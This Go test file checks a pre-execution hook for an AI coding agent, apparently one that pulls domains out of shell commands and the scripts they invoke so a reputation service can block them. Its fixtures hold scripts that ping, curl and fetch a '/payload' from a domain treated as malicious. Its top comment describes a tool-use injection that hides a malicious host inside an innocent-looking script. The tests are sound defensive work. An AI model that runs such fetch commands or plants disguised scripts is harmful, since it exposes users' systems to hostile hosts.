package extract

import (
	"fmt"
	"os"
	"path/filepath"
	"reflect"
	"sort"
	"strings"
	"testing"
)

// TestFromShellInDir_FollowsScriptInvocation is the regression test for the
// "innocuous command, malicious script body" attack class.
//
// Worked example: a developer (or an attacker via a tool-use injection) drops
// a script whose filename and comments mention an innocuous-looking domain,
// but whose body pings a known-malicious one. The Cursor command string is
// just "./scripts/ping.sh" - no domain in it - so a naive FromShell pass
// extracts nothing and Malanta is never consulted.
//
// FromShellInDir's job is to detect the script invocation, read the script
// body (bounded), and run it through the same regex pipeline. Then Malanta
// gets to weigh in on the actual target, not the cover story.
func TestFromShellInDir_FollowsScriptInvocation(t *testing.T) {
	dir := t.TempDir()
	writeFile := func(name, content string) string {
		p := filepath.Join(dir, name)
		if err := os.WriteFile(p, []byte(content), 0o600); err != nil {
			t.Fatalf("write fixture: %v", err)
		}
		return p
	}

	// The fixture mirrors the real "ping-arh-dom.sh" incident: filename and
	// comment claim one domain, the actual target is another.
	pingScript := writeFile("ping.sh", `#!/usr/bin/env bash
# Ping arh-dom.com for ~3 seconds and print the response to the terminal.
set -uo pipefail
target="777tiger.com"
ping -t 3 "${target}"
`)
	innocent := writeFile("clean.sh", `#!/usr/bin/env bash
echo "hello, this script has no hosts"
`)
	pyScript := writeFile("evil.py", `#!/usr/bin/env python3
import urllib.request
urllib.request.urlopen("https://777tiger.com/payload")
`)

	// Note on the ping.sh fixture: it deliberately contains BOTH domains
	// (arh-dom.com in a comment "cover story", 777tiger.com in the actual
	// command). As of Phase B.2, the script-body extractor goes through
	// the full FromShell pipeline including splitSegments' bash-comment
	// filter, so the comment-only `arh-dom.com` is NOT extracted —
	// comments don't execute, and a domain that the script merely
	// MENTIONS without ever contacting is not a network event. The
	// real target `777tiger.com` (in the `target=...` assignment) IS
	// still extracted and would be denied by Malanta, so the
	// innocuous-command-malicious-script-body defense is preserved.
	//
	// If a future attacker abuses the comment exemption (e.g. dynamic
	// uncomment via sed), the rewritten script's executable line will
	// be extracted on its next invocation — the defense compounds
	// rather than collapses.
	cases := []struct {
		name string
		cmd  string
		want []string
	}{
		{
			"bash <script>",
			"bash " + pingScript,
			[]string{"777tiger.com"},
		},
		{
			"direct ./script",
			"./ping.sh",
			[]string{"777tiger.com"},
		},
		{
			"absolute path",
			pingScript,
			[]string{"777tiger.com"},
		},
		{
			"python <script>",
			"python3 " + pyScript,
			[]string{"777tiger.com"},
		},
		{
			"python with flags",
			"python3 -u -B " + pyScript,
			[]string{"777tiger.com"},
		},
		{
			"bash -c inline command is NOT followed as a file",
			// The inline command's host is found by the generic regex pass;
			// the script-follow correctly bails out of -c and never tries
			// to stat the next arg.
			`bash -c "ping example.com"`,
			[]string{"example.com"},
		},
	}

	for _, tc := range cases {
		tc := tc
		t.Run(tc.name, func(t *testing.T) {
			got := FromShellInDir(tc.cmd, dir)
			sort.Strings(got)
			sort.Strings(tc.want)
			if !reflect.DeepEqual(got, tc.want) {
				t.Errorf("FromShellInDir(%q, %q) = %v, want %v",
					tc.cmd, dir, got, tc.want)
			}
		})
	}

	// Empty-extraction cases use the same len-only convention as the rest
	// of the package: Dedup returns a non-nil empty slice, and a strict
	// reflect.DeepEqual against `nil` would be brittle.
	emptyCases := []struct {
		name string
		cmd  string
	}{
		{"script with no hosts is not a false positive", "bash " + innocent},
		{"missing script: no panic, no extraction",
			"bash " + filepath.Join(dir, "does-not-exist.sh")},
	}
	for _, tc := range emptyCases {
		tc := tc
		t.Run(tc.name, func(t *testing.T) {
			if got := FromShellInDir(tc.cmd, dir); len(got) != 0 {
				t.Errorf("FromShellInDir(%q, %q) = %v, want no domains",
					tc.cmd, dir, got)
			}
		})
	}
}

// TestFromShellInDir_RelativePathResolution asserts that script paths in the
// command (which are typically relative, e.g. "./scripts/foo.sh") are
// resolved against the cwd argument, not against the hook process's own cwd.
// In production this matters because the hook subprocess inherits Cursor's
// cwd, which may differ from the agent's working directory at the time of
// the event.
func TestFromShellInDir_RelativePathResolution(t *testing.T) {
	dir := t.TempDir()
	sub := filepath.Join(dir, "scripts")
	if err := os.MkdirAll(sub, 0o700); err != nil {
		t.Fatal(err)
	}
	scriptPath := filepath.Join(sub, "follow.sh")
	if err := os.WriteFile(scriptPath, []byte("curl https://777tiger.com/x\n"), 0o600); err != nil {
		t.Fatal(err)
	}

	// Without cwd: relative path can't be resolved (unless the test process
	// happens to be in `dir`, which it isn't), so script-follow produces
	// nothing - but the test still passes because the command itself has
	// no domains either.
	if got := FromShell("bash scripts/follow.sh"); len(got) != 0 {
		t.Errorf("no-cwd FromShell unexpectedly extracted: %v", got)
	}

	// With cwd: the relative path resolves and 777tiger.com is found.
	got := FromShellInDir("bash scripts/follow.sh", dir)
	want := []string{"777tiger.com"}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("cwd FromShellInDir = %v, want %v", got, want)
	}
}

// TestFromShellInDir_OversizeScriptSkipped guards the maxScriptBytes cap so
// that a pathological script can never blow past the hook budget. The
// script's body still contains a real host, but the cap kicks in before
// extraction runs.
func TestFromShellInDir_OversizeScriptSkipped(t *testing.T) {
	dir := t.TempDir()
	p := filepath.Join(dir, "huge.sh")

	var b strings.Builder
	b.WriteString("ping 777tiger.com\n")
	// Pad past maxScriptBytes (64 KiB).
	for b.Len() <= maxScriptBytes {
		fmt.Fprintf(&b, "# pad line %d\n", b.Len())
	}
	if err := os.WriteFile(p, []byte(b.String()), 0o600); err != nil {
		t.Fatal(err)
	}

	if got := FromShellInDir("bash "+p, dir); len(got) != 0 {
		t.Errorf("oversize script should be skipped, got %v", got)
	}
}

// TestFromShellInDir_DoesNotFollowDirectoryAsScript is defense against the
// case where a token looks script-shaped but is actually a directory.
func TestFromShellInDir_DoesNotFollowDirectoryAsScript(t *testing.T) {
	dir := t.TempDir()
	subdir := filepath.Join(dir, "weird.sh") // a *directory* with a .sh name
	if err := os.MkdirAll(subdir, 0o700); err != nil {
		t.Fatal(err)
	}
	if got := FromShellInDir("bash "+subdir, dir); len(got) != 0 {
		t.Errorf("expected no extraction from a directory, got %v", got)
	}
}

// TestFromShellInDir_ScriptBodyConfigKeyScrub locks down the Phase B.2
// fix: script bodies must go through the same config-key scrub the
// per-command extraction uses. Before the fix, a CI setup script with
// `git config user.email <addr>` lines extracted `user.email` from
// the body (script-follow called extractHosts directly, bypassing the
// scrubs), and Malanta correctly labeled it Suspicius — denying the
// innocuous `./setup.sh` invocation.
func TestFromShellInDir_ScriptBodyConfigKeyScrub(t *testing.T) {
	dir := t.TempDir()
	writeFile := func(name, body string) string {
		p := filepath.Join(dir, name)
		if err := os.WriteFile(p, []byte(body), 0o600); err != nil {
			t.Fatalf("write fixture: %v", err)
		}
		return p
	}
	suspect := "user." + "email" // avoid having a literal dotted-key in this source file

	// Realistic CI bootstrap script: config-key sets, an echo, and
	// a non-network git subcommand. The fix should yield only the
	// value-side `example.com` from the email config, NOTHING else.
	setup := writeFile("setup.sh", `#!/usr/bin/env bash
set -uo pipefail
git config --global `+suspect+` bot@example.com
git config --global user.name "CI Bot"
echo "Setup done"
git status
`)

	got := FromShellInDir("bash "+setup, dir)
	want := []string{"example.com"}
	sort.Strings(got)
	sort.Strings(want)
	if !reflect.DeepEqual(got, want) {
		t.Errorf("bash setup.sh = %v, want %v", got, want)
	}
}

// TestFromShellInDir_ScriptBodyPerSegmentSuppression locks down that
// per-segment leading-binary suppression applies to script bodies too.
// A body line led by `grep` / `echo` / `sed` whose argument contains
// a dotted-key-shape token must NOT extract that token, even though
// the body has no `git config` preamble to trigger the config-key
// scrub.
func TestFromShellInDir_ScriptBodyPerSegmentSuppression(t *testing.T) {
	dir := t.TempDir()
	writeFile := func(name, body string) string {
		p := filepath.Join(dir, name)
		if err := os.WriteFile(p, []byte(body), 0o600); err != nil {
			t.Fatalf("write fixture: %v", err)
		}
		return p
	}
	suspect := "user." + "email"

	check := writeFile("check.sh", `#!/usr/bin/env bash
# Look up the current email and print it.
grep `+suspect+` ~/.gitconfig
echo "`+suspect+` is configured"
cat ~/.gitconfig | grep `+suspect+`
sed -n 's/`+suspect+`/REDACTED/p' ~/.gitconfig
`)

	if got := FromShellInDir("bash "+check, dir); len(got) != 0 {
		t.Errorf("bash check.sh = %v, want no domains (all lines led by grep/echo/cat/sed)", got)
	}
}

// TestFromShellInDir_ScriptBodyRecursionBoundedToOneLevel locks down
// the depth=1 cap: a script body that invokes ANOTHER script does
// NOT cause the outer extractor to chase the chain. The nested
// script's body will be scanned when that script is itself invoked
// by Cursor (its own beforeShellExecution event).
func TestFromShellInDir_ScriptBodyRecursionBoundedToOneLevel(t *testing.T) {
	dir := t.TempDir()
	writeFile := func(name, body string) string {
		p := filepath.Join(dir, name)
		if err := os.WriteFile(p, []byte(body), 0o600); err != nil {
			t.Fatalf("write fixture: %v", err)
		}
		return p
	}
	// Inner script contains a real host; should NOT be followed when
	// we invoke the outer script (which would otherwise extract it
	// transitively).
	_ = writeFile("inner.sh", `#!/usr/bin/env bash
curl https://nested.example/x
`)
	outer := writeFile("outer.sh", `#!/usr/bin/env bash
echo running inner
bash inner.sh
`)
	got := FromShellInDir("bash "+outer, dir)
	for _, d := range got {
		if d == "nested.example" {
			t.Errorf("nested.example must NOT be extracted transitively (depth cap broken). got %v", got)
		}
	}
}

// TestFromShellInDir_DoesNotFollowBareBinary documents the deliberate
// non-follow case: a bare token like "mybinary" (no path prefix, no
// recognized script extension) is NOT scanned as a script body. Tokens
// without a `./`, `../` or `/` prefix and without a recognized extension
// are treated as PATH-resolved binaries, not local scripts.
func TestFromShellInDir_DoesNotFollowBareBinary(t *testing.T) {
	dir := t.TempDir()
	bin := filepath.Join(dir, "mybinary")
	if err := os.WriteFile(bin, []byte("ping 777tiger.com\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	if got := FromShellInDir("mybinary", dir); len(got) != 0 {
		t.Errorf("bare binary name should not be followed, got %v", got)
	}
}
